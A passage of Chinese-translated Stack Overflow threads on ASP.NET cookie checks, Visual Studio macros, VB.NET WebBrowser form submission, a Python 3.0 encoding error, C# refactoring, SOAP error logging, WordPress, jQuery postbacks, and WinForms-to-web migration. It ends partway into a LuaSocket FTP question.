                currentUrl = currentUrl + "?cc=true"
            End If
            Response.Redirect(currentUrl)
        Else
            'let's check if Cookies are enabled
            If Request.Cookies("SupportCookies") Is Nothing Then
                'Cookies are disabled
                Return True
            Else
                'Cookies are enabled
                Return False
            End If
        End If
    Else
        Return True
    End If
End Function 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2011-02-04T20:03:34.863

您还可以检查 的值`Request.Browser.Cookies`。如果为 true，则浏览器支持 cookie。

* * *

## 回答 #8

> 赞同：-3
> 
> 时间：2010-04-06T06:42:24.197

这是最好的方法

取自 [http://www.eggheadcafe.com/community/aspnet/7/42769/cookies-enabled-or-not-.aspx](http://www.eggheadcafe.com/community/aspnet/7/42769/cookies-enabled-or-not-.aspx)

```
function cc()
{
 /* check for a cookie */
  if (document.cookie == "") 
  {
    /* if a cookie is not found - alert user -
     change cookieexists field value to false */
    alert("COOKIES need to be enabled!");

    /* If the user has Cookies disabled an alert will let him know 
        that cookies need to be enabled to log on.*/ 

    document.Form1.cookieexists.value ="false"  
  } else {
   /* this sets the value to true and nothing else will happen,
       the user will be able to log on*/
    document.Form1.cookieexists.value ="true"
  }
} 
```

感谢文卡特 K

# visual-studio - 添加 Visual Studio 2008 上下文菜单项的最简单方法是什么？

> ID：210323
> 
> 赞同：4
> 
> 时间：2008-10-16T21:07:50.510
> 
> 标签：visual-studio, visual-studio-2008, visual-studio-addins

当您在 Visual Studio 中右键单击某个文件扩展名时，我想添加一个自定义菜单项。

似乎有一些帮助性的开源项目可以实现这一点，但我想问一下是否有人曾经使用过它们，它们有多容易——你能帮助我并提供一个起点吗？

我研究过的一个是： http: [//www.codeplex.com/ManagedMenuExtension](http://www.codeplex.com/ManagedMenuExtension)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-04-29T00:36:38.870

是的，最简单的方法是创建自定义宏来处理您的任务（在 VB 中）。

## 添加宏

首先选择*工具>宏>宏*IDE (Alt+F11)。为了清楚起见，添加一个新模块，例如“ContextMenu”，并在其中放入以下代码：

```
Imports System
Imports EnvDTE
Imports EnvDTE80
Imports EnvDTE90
Imports System.Diagnostics

Public Module ContextMenu

Public Sub DoSomething()
    'Few declarations'
    Dim SolutionExplorer As UIHierarchy
    Dim Item As UIHierarchyItem
    Dim SelectedItem As EnvDTE.ProjectItem

    'Getting the solution explorer'
    SolutionExplorer = DTE.Windows.Item(Constants.vsext_wk_SProjectWindow).Object()

    'Iterating through all selected items'
    For Each Item In SolutionExplorer.SelectedItems
        'Getting the item'
        SelectedItem = CType(Item.Object, EnvDTE.ProjectItem)

        'Do some stuff here'
        If SelectedItem.FileNames(1).EndsWith("txt") Then
            MsgBox("We got the text file!", , SelectedItem.FileNames(1))
        Else
            MsgBox("We got something else...", , SelectedItem.FileNames(1))
        End If
    Next
End Sub
End Module 
```

当然，您必须自定义处理选定文件名的方式。目前，它只会为每个文件显示一个弹出窗口，如果它是 txt 文件则不同。

## 自定义上下文菜单

第二个任务是将您的自定义宏添加到上下文菜单中；转到： *工具>自定义*

从“工具栏”选项卡上的列表中勾选上下文菜单（带有所有上下文菜单的新工具栏应出现在主窗口上）并切换到“命令”选项卡。现在，从上下文菜单工具栏中选择：*“项目和解决方案上下文菜单”>项目*，然后从“命令”选项卡将宏拖到它上面。在右键菜单下更改其名称/图标/按钮。

现在您可以测试和使用它了。您新添加的宏应出现在项目上下文菜单中。玩得开心！

# vb.net - VB.NET - 单击 Webbrowser 页面上的提交按钮

> ID：210342
> 
> 赞同：8
> 
> 时间：2008-10-16T21:12:38.100
> 
> 标签：vb.net, input, browser

我在 webbrowser 对象上打开了一个 html 页面，我可以输入用户名和密码，但我被卡住了，不知道如何提交信息。这是用户名/密码提交的html代码：

```
<div id="signin">
    <h2 class="ir">
        <em></em>Sign in</h2>
    <form action="/login/" method="post">
    <input id="login-url" name="login[url]" 
           type="hidden" value="/characters/" />
    <input id="login-urlError" name="login[urlError]" 
           type="hidden" value="/account/?error=1" />
    <fieldset>
        <ul>
            <li class="row">
                <label for="login-username">
                    Username <span class="req">*</span>
                </label>
                <input id="login-username" name="login[username]"
                        type="text" class="TextBox" value="" />
            </li>
            <li class="row">
                <label for="login-password">
                    Password <span class="req">*</span>
                </label>
                <input id="login-password" name="login[password]"
                       type="password" class="TextBox Password" value="" />
            </li>
            <li class="but">
                <input name="login[submit]" type="image" 
                       class="img" alt="Login &raquo;" 
                       src="/_pub/img/hp/but-login.png" />
            </li>
        </ul>
    </fieldset>
    </form>
    <p>
        <a href="/account/password-reset/">ACCOUNT TROUBLE?</a>
    </p>
</div> 
```

我使用以下内容输入用户名和密码：

```
WebBrowser1.Document.GetElementById("login-username").SetAttribute("Value", Information.txtuser.Text)
WebBrowser1.Document.GetElementById("login-password").SetAttribute("Value", Information.txtpass.Text) 
```

我现在应该用什么来提交信息？我尝试按名称获取元素并不断获取索引超出范围错误，索引应该是-1或0，但它是。

您的帮助将不胜感激！！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-05T18:23:56.900

`WebBrowser1.Document.GetElementById(*element id string*).InvokeMember("submit")`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2011-01-11T14:05:06.907

我搜索了任何不使用`SendKeys(CHR(13))`我曾经在浏览器中提交内容的“”方法的解决方案。在这种情况下，我很高兴看到你的

```
InvokeMember("click") 
```

但不知道为什么你知道你必须在那里写“点击”。总之感谢

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2010-05-17T17:09:28.953

这是我对类似于此问题的解决方案：

```
System.Windows.Forms.WebBrowser www;

void VerificarWebSites()
{
    www = new System.Windows.Forms.WebBrowser();
    www.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(www_DocumentCompleted_login);
    www.Navigate(new Uri("http://www.meusite.com.br"));
}

void www_DocumentCompleted_login(object sender, WebBrowserDocumentCompletedEventArgs e)
{            
    www.DocumentCompleted -= new WebBrowserDocumentCompletedEventHandler(www_DocumentCompleted_login);
    www.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(www_DocumentCompleted_logado);

    www.Document.Forms[0].All["tbx_login"].SetAttribute("value", "Gostoso");
    www.Document.Forms[0].All["tbx_senha"].SetAttribute("value", "abcdef");
    www.Document.GetElementById("btn_login").Focus();
    www.Document.GetElementById("btn_login").InvokeMember("click");
}

void www_DocumentCompleted_logado(object sender, WebBrowserDocumentCompletedEventArgs e)
{
    System.IO.StreamWriter sw = new StreamWriter("c:\\saida_teste.txt");
    sw.Write(www.DocumentText);
    sw.Close();
    MessageBox.Show(e.Url.AbsolutePath);
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-22T10:37:45.620

[http://stackoverflow.com](http://stackoverflow.com)让我受益匪浅。我在几个小时内徘徊自动登录并从 vb 应用程序提交到另一个网站。由于这个网站的帮助，我能够完成我的任务

我必须登录以下 web php 页面。

```
<HTML>

<body>
<div align="center"><img src="banner.png" height="80px" /></div>
<script type="text/javascript">
$(document).ready(function(){
            $("#login").validate();
            $("#login_container").css({'position': 'absolute', 
                'top' : (($(window).height()/2) - $("#login_container").height()/2)+'px'});
            $("#login_container").css({'left' : (($(window).width()/2) - $("#login_container").width()/2)+'px'});
        });
    </script>
    <div id="login_container">
        <form name="login" id="login" action="?q=login" method="post">
        <table>
          <tr><td>Username</td><td><input type="text" name="name" class="required"/></td></tr>
          <tr><td>Password</td><td><input type="password" name="password" class="required"/></td></tr>
          <tr><td></td><td><input type="submit" name="subimt" value="Login" /></td></tr>
        </table>
        </form>
    </div>
</body>
</html> 
```

对于自动登录并单击，我编写了以下 VB.Net 代码。在`form1`我放置了一个按钮和一个 Webbrowser 控件

```
Imports System.IO
Imports System.Windows.Forms

Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        WebBrowser1.Navigate("http://xyz.com")

    End Sub

    Private Sub WebBrowser1_DocumentCompleted(ByVal sender As Object, ByVal e As System.Windows.Forms.WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted
        WebBrowser1.Document.GetElementById("name").SetAttribute("Value", "bharatlal")
        WebBrowser1.Document.GetElementById("password").SetAttribute("Value", "mahato")
        WebBrowser1.Document.GetElementById("subimt").Focus()
        WebBrowser1.Document.GetElementById("subimt").InvokeMember("click")
    End Sub
End Class 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-11-11T19:26:45.233

这似乎很容易工作。

```
 Public Function LoginAsTech(ByVal UserID As String, ByVal Pass As String) As Boolean
        Dim MyDoc As New mshtml.HTMLDocument
        Dim DocElements As mshtml.IHTMLElementCollection = Nothing
        Dim LoginForm As mshtml.HTMLFormElement = Nothing

        ASPComplete = 0
        WB.Navigate(VitecLoginURI)
        BrowserLoop()

        MyDoc = WB.Document.DomDocument
        DocElements = MyDoc.getElementsByTagName("input")
        For Each i As mshtml.IHTMLElement In DocElements

            Select Case i.name
                Case "seLogin$UserName"
                    i.value = UserID
                Case "seLogin$Password"
                    i.value = Pass
                Case Else
                    Exit Select
            End Select

            frmServiceCalls.txtOut.Text &= i.name & " : " & i.value & " : " & i.type & vbCrLf
        Next i

        'Old Method for Clicking submit
        'WB.Document.Forms("form1").InvokeMember("submit")

        'Better Method to click submit
        LoginForm = MyDoc.forms.item("form1")
        LoginForm.item("seLogin$LoginButton").click()
        ASPComplete = 0
        BrowserLoop()

        MyDoc= WB.Document.DomDocument
        DocElements = MyDoc.getElementsByTagName("input")
        For Each j As mshtml.IHTMLElement In DocElements
            frmServiceCalls.txtOut.Text &= j.name & " : " & j.value & " : " & j.type & vbCrLf

        Next j

        frmServiceCalls.txtOut.Text &= vbCrLf & vbCrLf & WB.Url.AbsoluteUri & vbCrLf
        Return 1
End Function 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-10-19T00:17:38.867

```
 Private Sub bt_continue_Click(sender As Object, e As EventArgs) Handles bt_continue.Click
    wb_apple.Document.GetElementById("phoneNumber").Focus()
    wb_apple.Document.GetElementById("phoneNumber").InnerText = tb_phonenumber.Text
    wb_apple.Document.GetElementById("reservationCode").Focus()
    wb_apple.Document.GetElementById("reservationCode").InnerText = tb_regcode.Text
    'SendKeys.Send("{Tab}{Tab}{Tab}")
    'For Each Element As HtmlElement In wb_apple.Document.GetElementsByTagName("a")
    'If Element.OuterHtml.Contains("iReserve.sms.submitButtonLabel") Then
    'Element.InvokeMember("click")
    'Exit For
    ' End If
    'Next Element
    wb_apple.Document.GetElementById("smsPageForm").Focus()
    wb_apple.Document.GetElementById("smsPageForm").InvokeMember("submit")

End Sub 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-16T21:57:22.783

您可以尝试为表单提供一个 ID，以便获取它，然后从 Javascript 调用中调用 form.submit()。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-10-08T06:24:34.110

只需按照两个步骤使用代码单击任何按钮。

1.  聚焦要单击的按钮或元素

    `WebBrowser1.Document.GetElementById("place id here").Focus()`

2.  使用以下代码模拟鼠标点击

    `SendKeys.Send("{ENTER}")`

# python - py3k RC-1：“LookupError：未知编码：uft-8”

> ID：210344
> 
> 赞同：1
> 
> 时间：2008-10-16T21:13:29.207
> 
> 标签：python, python-3.x

我刚刚安装了 Python 3.0 的第一个候选版本，输入后出现此错误：

```
>>> help('modules foo') 
```

```
[...]
LookupError：未知编码：uft-8
```

请注意，它说的是**uft** -8 而不是**utf** -8

这是 py3k 特定的错误还是我的错误配置？我没有在这台法语语言环境 Windows XP SP3 机器上安装任何其他版本的 Python。

**编辑**

10 月 16 日， [Alex Coventry](https://stackoverflow.com/users/22899/alex-coventry)填补了一个[错误。](http://bugs.python.org/issue4135?@ok_message=msg%2074871%20created%3Cbr%3Eissue%204135%20created&@template=item)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-16T21:43:43.967

这不是错字，而是测试模块中的故意错误。

```
met% pwd
/home/coventry/src/Python-3.0rc1
met% rgrep uft-8 .
./Lib/test/bad_coding.py:# -*- coding: uft-8 -*-
./py3k/Lib/test/bad_coding.py:# -*- coding: uft-8 -*- 
```

删除此模块会导致`help`命令以不同的方式失败。

然而，这是一个错误。有人应该提交报告。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-16T21:34:16.700

看起来像是某个配置文件中的拼写错误，无论是在 Py3k 包中还是在您的机器上。您可以尝试安装稳定的最终 Python 2.6（它支持 3.0 的语法更改，并使用 import from `__future__`），如果可行，您可能应该提交错误报告。

# c# - 删除 C# 中重复的硬编码循环和条件

> ID：210353
> 
> 赞同：8
> 
> 时间：2008-10-16T21:18:08.260
> 
> 标签：c#, refactoring, loops, conditional-statements

我有一个类，它比较相同对象的 2 个实例，并生成它们的差异列表。这是通过循环遍历关键集合并使用已更改的列表填充一组其他集合来完成的（查看下面的代码后可能更有意义）。这有效，并生成一个对象，让我知道在“旧”对象和“新”对象之间究竟添加和删除了什么。
我的问题/担忧是……它真的很丑，有很多循环和条件。有没有更好的方法来存储/处理这个，而不必如此依赖无休止的硬编码条件组？

```
 public void DiffSteps()
    {
        try
        {
            //Confirm that there are 2 populated objects to compare
            if (NewStep.Id != Guid.Empty && SavedStep.Id != Guid.Empty)
            {
                //<TODO> Find a good way to compare quickly if the objects are exactly the same...hash?

                //Compare the StepDoc collections:
                OldDocs = SavedStep.StepDocs;
                NewDocs = NewStep.StepDocs;
                Collection<StepDoc> docstoDelete = new Collection<StepDoc>();

                foreach (StepDoc oldDoc in OldDocs)
                {
                    bool delete = false;
                    foreach (StepDoc newDoc in NewDocs)
                    {
                        if (newDoc.DocId == oldDoc.DocId)
                        {
                            delete = true;
                        }
                    }
                    if (delete)
                        docstoDelete.Add(oldDoc);
                }

                foreach (StepDoc doc in docstoDelete)
                {
                    OldDocs.Remove(doc);
                    NewDocs.Remove(doc);
                }

                //Same loop(s) for StepUsers...omitted for brevity

                //This is a collection of users to delete; it is the collection
                //of users that has not changed.  So, this collection also needs to be checked 
                //to see if the permisssions (or any other future properties) have changed.
                foreach (StepUser user in userstoDelete)
                {
                    //Compare the two
                    StepUser oldUser = null;
                    StepUser newUser = null;

                    foreach(StepUser oldie in OldUsers)
                    {
                        if (user.UserId == oldie.UserId)
                            oldUser = oldie;
                    }

                    foreach (StepUser newie in NewUsers)
                    {
                        if (user.UserId == newie.UserId)
                            newUser = newie;
                    }

                    if(oldUser != null && newUser != null)
                    {
                        if (oldUser.Role != newUser.Role)
                            UpdatedRoles.Add(newUser.Name, newUser.Role);
                    }

                    OldUsers.Remove(user);
                    NewUsers.Remove(user);
                }

            } 
        }
        catch(Exception ex)
        {
            string errorMessage =
                String.Format("Error generating diff between Step objects {0} and {1}", NewStep.Id, SavedStep.Id);
            log.Error(errorMessage,ex);
            throw;
        }
    } 
```

* * *

目标框架是 3.5。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-16T21:20:30.207

您使用的是 .NET 3.5 吗？我确信 LINQ to Objects 会让这一切*变得*简单得多。

要考虑的另一件事是，如果您有很多具有通用模式的代码，其中只有少数事情发生了变化（例如，“我在比较哪个属性？”那么这是一个很好的候选泛型方法接受委托代表这种差异。

编辑：好的，现在我们知道我们可以使用 LINQ：

**第 1 步：减少嵌套** 首先我会去掉一层嵌套。代替：

```
if (NewStep.Id != Guid.Empty && SavedStep.Id != Guid.Empty)
{
    // Body
} 
```

我会做：

```
if (NewStep.Id != Guid.Empty && SavedStep.Id != Guid.Empty)
{
    return;
}
// Body 
```

像这样的早期返回可以使代码更具可读性。

**第 2 步：查找要删除的文档**

如果您可以简单地为 Enumerable.Intersect 指定一个键函数，这会更好。您可以指定一个相等比较器，但即使使用实用程序库，构建其中一个也很痛苦。呃，好吧。

```
var oldDocIds = OldDocs.Select(doc => doc.DocId);
var newDocIds = NewDocs.Select(doc => doc.DocId);
var deletedIds = oldDocIds.Intersect(newDocIds).ToDictionary(x => x);
var deletedDocs = oldDocIds.Where(doc => deletedIds.Contains(doc.DocId)); 
```

**第 3 步：删除文档**
使用现有的 foreach 循环，或更改属性。如果您的属性实际上是 List<T> 类型，那么您可以使用 RemoveAll。

**第 4 步：更新和删除用户**

```
foreach (StepUser deleted in usersToDelete)
{
    // Should use SingleOfDefault here if there should only be one
    // matching entry in each of NewUsers/OldUsers. The
    // code below matches your existing loop.
    StepUser oldUser = OldUsers.LastOrDefault(u => u.UserId == deleted.UserId);
    StepUser newUser = NewUsers.LastOrDefault(u => u.UserId == deleted.UserId);

    // Existing code here using oldUser and newUser
} 
```

进一步简化事情的一种选择是使用 UserId 实现一个 IEqualityComparer（一个用于带有 DocId 的文档）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T21:42:29.880

当您至少使用 .NET 2.0 时，我建议在 StepDoc 上实现 Equals 和 GetHashCode ( [http://msdn.microsoft.com/en-us/library/7h9bszxx.aspx )。](http://msdn.microsoft.com/en-us/library/7h9bszxx.aspx)作为它如何清理代码的提示，您可以使用以下内容：

```
 Collection<StepDoc> docstoDelete = new Collection<StepDoc>();
foreach (StepDoc oldDoc in OldDocs)
                    {
                        bool delete = false;
                        foreach (StepDoc newDoc in NewDocs)
                        {
                            if (newDoc.DocId == oldDoc.DocId)
                            {
                                delete = true;
                            }
                        }
                        if (delete) docstoDelete.Add(oldDoc);
                    }
                    foreach (StepDoc doc in docstoDelete)
                    {
                        OldDocs.Remove(doc);
                        NewDocs.Remove(doc);
                    } 
```

有了这个：

```
oldDocs.FindAll(newDocs.Contains).ForEach(delegate(StepDoc doc) {
                        oldDocs.Remove(doc);
                        newDocs.Remove(doc);
                    }); 
```

这假设 oldDocs 是 StepDoc 的列表。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T22:24:01.217

如果 StepDocs 和 StepUsers 都实现了 IComparable<T>，并且它们存储在实现 IList<T> 的集合中，那么您可以使用以下辅助方法来简化此功能。只需调用两次，一次使用 StepDocs，一次使用 StepUsers。使用 beforeRemoveCallback 来实现用于进行角色更新的特殊逻辑。我假设这些集合不包含重复项。我省略了参数检查。

```
public delegate void BeforeRemoveMatchCallback<T>(T item1, T item2);

public static void RemoveMatches<T>(
                IList<T> list1, IList<T> list2, 
                BeforeRemoveMatchCallback<T> beforeRemoveCallback) 
  where T : IComparable<T>
{
  // looping backwards lets us safely modify the collection "in flight" 
  // without requiring a temporary collection (as required by a foreach
  // solution)
  for(int i = list1.Count - 1; i >= 0; i--)
  {
    for(int j = list2.Count - 1; j >= 0; j--)
    {
      if(list1[i].CompareTo(list2[j]) == 0)
      {
         // do any cleanup stuff in this function, like your role assignments
         if(beforeRemoveCallback != null)
           beforeRemoveCallback(list[i], list[j]);

         list1.RemoveAt(i);
         list2.RemoveAt(j);
         break;
      }
    }
  }
} 
```

这是更新代码的 beforeRemoveCallback 示例：

```
BeforeRemoveMatchCallback<StepUsers> callback = 
delegate(StepUsers oldUser, StepUsers newUser)
{
  if(oldUser.Role != newUser.Role)
    UpdatedRoles.Add(newUser.Name, newUser.Role);
}; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-16T21:25:26.763

你的目标是什么框架？（这将使答案有所不同。）

为什么这是一个空函数？

签名不应该是这样的：

```
DiffResults results = object.CompareTo(object2); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-16T21:50:45.060

如果你想隐藏树状结构的遍历，你可以创建一个隐藏“丑陋”循环结构的 IEnumerator 子类，然后使用 CompareTo 接口：

```
MyTraverser t =new Traverser(oldDocs, newDocs);

foreach (object oldOne in t)
{
    if (oldOne.CompareTo(t.CurrentNewOne) != 0)
    {
        // use RTTI to figure out what to do with the object
    }
} 
```

但是，我完全不确定这是否会特别简化任何事情。我不介意看到嵌套的遍历结构。代码是嵌套的，但并不复杂或特别难以理解。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-11-10T11:43:03.217

在 foreach 中使用多个列表很容易。做这个：

```
foreach (TextBox t in col)
{
    foreach (TextBox d in des) // here des and col are list having textboxes
    {
        // here remove first element then and break it
        RemoveAt(0);
        break;
    }
} 
```

它的工作原理与 foreach 类似（TextBox t in col && TextBox d in des）

# .net - 从失败并显示 HTTP 500 错误代码的 .Net Web 服务捕获数据

> ID：210354
> 
> 赞同：4
> 
> 时间：2008-10-16T21:18:18.993
> 
> 标签：.net, web-services, iis, monitoring, trace

我有一个托管在 IIS 6.0 中的 .net Web 服务，它会定期以 http 500 失败，因为客户端使用与 wsdl 不匹配的数据连接到它。

诸如在方法中将元素指定为 int 类型并且入站 xml 元素包含十进制数之类的事情。

WSDL 元素定义：

```
<s:element minOccurs="1" 
    maxOccurs="1" 
    form="unqualified" name="ItemCount" type="s:int" > 
```

提供的元素：

```
<ItemCount>1.0</ItemCount> 
```

这会在 iis 日志中留下 500 错误，但没有返回有关 soap 故障的信息或导致错误的输入数据。

目前，我已经诊断出使用wireshark捕获所有数据所提供的数据的几个问题，但我想知道其他可能不那么侵入性的选项。

有什么方法可以捕获正在发送的导致 500 错误的数据（希望仅在 500 发生时捕获数据）？可能通过：

*   配置 IIS
*   配置网络服务
*   更改网络服务的代码

**在测试 tbreffni 提供的答案后进行**编辑****

 **最适合我在 tbreffni 之后的答案 - 还有其他几个很好的响应，但答案允许捕获导致反序列化错误的有效负载，而无需运行 fiddler 或 wireshark 之类的东西。

关于实际运行 SOAP 扩展的信息有点少，所以我在下面包含了我认为必要的步骤：

*   [根据MSDN](http://msdn.microsoft.com/en-us/library/system.web.services.protocols.soapextension.aspx)文章 将 SOAP 扩展构建为 .dll
*   将 .dll 添加到 bin 目录以供服务跟踪
*   在要跟踪的服务的 web.config 中，将以下内容添加到 webServices 部分，替换 SOAPTraceExtension.TraceExtension 和 SOAPTraceExtension 以匹配您的扩展。

    <webServices>
      <soapExtensionTypes>
        <add type="SOAPTraceExtension.TraceExtension, SOAPTraceExtension" priority="1" group="0"/>
      </soapExtensionTypes>
    </webServices>

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-16T21:54:10.200

我会尝试[fiddler](http://msdn.microsoft.com/en-us/library/bb250446(VS.85).aspx)或[here](http://www.fiddlertool.com/)。并非专门用于 Web 服务，通常用于客户端，它可以用作反向[代理](http://www.fiddlertool.com/Fiddler/help/reverseproxy.asp)。

它非常具有脚本能力和“请求/响应”意识，因此我认为您可能只能捕获 500 个错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-20T23:45:19.787

您可以在 Web 服务中实现一个全局异常处理程序，以记录发生的任何异常的详细信息。这对您当前的问题很有用，而且它在生产环境中非常有用，因为它可以让您深入了解抛出了多少异常以及由哪些代码引发。

要为 .Net Web 服务实现异常处理程序，您需要创建一个 SOAP 扩展。有关示例，请参阅以下[MSDN 文章。](http://msdn.microsoft.com/en-us/library/system.web.services.protocols.soapextension.aspx)我已经在几个生产 Web 服务中使用了这种方法，它对于确定发生了什么问题以及发生在哪里非常宝贵。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T22:34:50.150

我自己从未使用过这个，但我只是在 MSDN 中找到了这个：[在 ASP.NET Web 服务中启用跟踪](http://msdn.microsoft.com/en-us/library/bb885203.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-21T00:00:30.910

你看过 IIS 基于请求的跟踪吗？：[http ://technet.microsoft.com/en-us/library/cc786920.aspx](http://technet.microsoft.com/en-us/library/cc786920.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-16T22:14:08.380

经过我自己的一些思考后，我能看到的当前最佳解决方案是将一个轻量级的外观 Web 服务组合在一起，该服务接受一个 xml blob 作为输入。

然后我可以让我的外观服务使用客户端提供的输入数据调用真实服务，然后：

*   处理任何错误，记录源数据和返回的肥皂故障
*   将来自良好数据的响应传回客户端

这只是一个临时措施（我强烈反对没有明确说明他们接受的 XML 的 Web 服务），但它可能会给我更多的筹码来克服在客户端的生产环境中诊断此类错误的困难连接到 Web 服务不遵守 wsdl 或无法读取返回的肥皂错误。

值得庆幸的是，在这种情况下，只有一方发布到 Web 服务 - 数据包嗅探器方法（fiddler 或 wireshark）是可行的，但缺少 500 个错误的日志记录确实让我想到“有什么更好的选择？”。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-20T23:57:06.987

如果您想使用工具，请使用 WireShark。

否则，最简单的方法是捕获“一切”（假设您使用的是 ASMX）是在 system.net 上启用跟踪

[http://blogs.msdn.com/dgorti/archive/2005/09/18/471003.aspx](http://blogs.msdn.com/dgorti/archive/2005/09/18/471003.aspx)

如果您使用的是 WCF，它有很好的跟踪支持，您可以使用 svctraceviewer 查看跟踪日志。听起来你好像没有使用 WCF。

# wordpress - WordPress - 更改的目录和图像不出现

> ID：210355
> 
> 赞同：0
> 
> 时间：2008-10-16T21:18:26.277
> 
> 标签：wordpress

我更改了我的 WordPress 安装所在的文件夹。

但是，这很好用，只是现在我的所有图像都没有显示出来。

问题是每个帖子都有图片的完整网址。（不是我做的，这似乎是默认设置）

是否有可用的工具或快速修复程序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-17T01:03:42.860

Wordpress有一个[更新 URL](http://www.velvetblues.com/web-development-blog/wordpress-plugin-update-urls/)插件可以帮助您。希望有帮助！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T21:21:18.050

您需要更新设置以反映管理部分设置页面上的目录更改。

**编辑：**

由于这似乎是帖子本身的问题，您可能必须编写一个快速修复脚本，该脚本贯穿您的帖子表搜索`'="/'`或类似内容并更新任何硬编码链接。

# asp.net - 当用户在文本框中按下返回时，我可以取消回发吗？

> ID：210359
> 
> 赞同：6
> 
> 时间：2008-10-16T21:19:13.937
> 
> 标签：asp.net, jquery

我有一个`textbox`由 jQuery 处理的输入。

```
$('input.Search').bind("keyup", updateSearchTextbox); 
```

当我在文本框中按下`Enter`时，我得到一个回发，这把一切都搞砸了。我怎样才能捕获该 Enter 并忽略它？

（只是为了抢占一个可能的建议：文本框必须是`<asp:textbox ... />`- 我不能用 . 替换它`<input ... />`。）

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-16T21:23:57.327

当您按下回车键时，您的浏览器会自动提交表单。要取消此操作，请将 return false 添加到您的 updateSearchTextBox 函数。

如果这不起作用，试试这个：

```
<script language="JavaScript">

function disableEnterKey(e)
{
     var key;     
     if(window.event)
          key = window.event.keyCode; //IE
     else
          key = e.which; //firefox     

     return (key != 13);
}

</script> 
```

在您的代码隐藏中：

```
 textbox.Attributes.Add("OnKeyPress","return disableEnterKey(event)"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T21:33:19.790

Ben Nadel 有一篇关于如何使用 JQuery 执行此操作的精彩博客文章：[http ://www.bennadel.com/blog/1364-Ask-Ben-Optimizing-Form-Inputs-For-Numeric-Keypad-Usage.htm](http://www.bennadel.com/blog/1364-Ask-Ben-Optimizing-Form-Inputs-For-Numeric-Keypad-Usage.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T21:48:54.453

感谢所有回复的人。这是我的新`updateSearchTextbox`功能，效果很好：

```
updateSearchTextbox = function(e) {
    /// <summary>
    /// Handles keyup event on search textbox
    /// </summary>

    if (e.which == "13") {
        // update now
        updateConcessions();
        // Don't post back
        return (false);
    } else {
        delayedUpdateConcessions();
    }

} 
```

# c# - 查看需要去 Winform 到 Webform，你有什么建议？

> ID：210368
> 
> 赞同：0
> 
> 时间：2008-10-16T21:24:11.803
> 
> 标签：c#, .net, .net-2.0, webforms, migration

我们的应用程序结构良好（我们已经尽力了！）并且我们已经将模型从视图中分离出来，现在，我们需要通过 Web 访问将一些信息提供给我们的客户端。我们想用 IIS 和一些 webform 构建一些小的东西。

这里有一些您可能认为有用的信息：

1.  我们的控制器有数据库查询线程
2.  我们的数据库是 PostGresql
3.  一切都是用 C#2.0 构建的
4.  我们在 Winform 中的视图和控制器之间使用了很多数据绑定。
5.  Winform 将留作内部用途，只有一小部分会在 Internet 上可用。

你对这样的举动有什么建议？

## 更新

我们将在我们的公司服务器中托管网络，因此数据库将保留在企业内部。无需复制数据或任何同步。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-30T04:26:35.650

我认为迈克尔所说的“同步”是数据库中的数据和 Winform 应用程序呈现的视图。

我们遇到了类似的问题，我们想出的解决方案是创建一个通过 XML 公开数据的 Web 服务，并使用来自 Web 应用程序和 Winform 应用程序的服务。每次更新数据时都将其发送到 Web 服务，每次执行查询时都会从服务中获取最新数据。不要考虑在 Winform 应用程序上缓存数据，除非您的配置文件数据显示它是一个瓶颈，或者您希望在未连接网络的情况下运行。

这在 .Net 2 中是完全可能的，您不需要 3.0 或 WCF。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-27T14:18:10.577

最大的挑战是在本地 Winforms 应用程序和托管的 Webforms 应用程序之间同步您的数据库。一旦你这样做了，创建网络应用程序就很容易了。

如果您的 Web 应用程序是只读的，那么您可以设置复制。找到你喜欢的工具。我通过快速搜索找到的三个是：

*   [懒惰-I](http://slony.info/)
*   [猛犸复制器](http://www.commandprompt.com/products/mammothreplicator)
*   [布卡多](http://bucardo.org/)

如果您的 Web 应用程序不是只读的，那么问题就更加困难了。您可能需要考虑升级到 .NET 3.0 或 3.5，以便可以使用 WCF。如果功能上有很大的重叠，您可能希望将数据以独占方式移动到 Web 并通过 WCF 服务公开。

# ftp - LuaSocket FTP 总是超时

> ID：210371
> 
> 赞同：3
> 
> 时间：2008-10-16T21:25:47.620
> 
> 标签：ftp, lua, luasocket, passive-mode

